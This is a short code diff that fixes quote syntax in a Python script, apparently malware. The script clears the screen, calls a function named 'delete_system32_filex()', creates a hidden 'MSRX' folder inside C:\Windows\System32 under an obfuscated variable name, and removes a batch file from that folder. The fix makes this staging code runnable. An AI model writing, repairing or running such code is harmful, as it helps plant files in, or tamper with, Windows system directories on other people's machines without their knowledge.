@@ -59,8 +59,8 @@ delete_system32_filex()
 os.system('cls')
 dcnmwxdr = r'C:\Windows\System32\MSRX'
 
-if os.path.exists(r"C:\Windows\System32\MSRX\aesv1.bat):
-    os.remove(r"C:\Windows\System32\MSRX\aesv1.bat)
+if os.path.exists(r"C:\Windows\System32\MSRX\aesv1.bat"):
+    os.remove(r"C:\Windows\System32\MSRX\aesv1.bat")
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
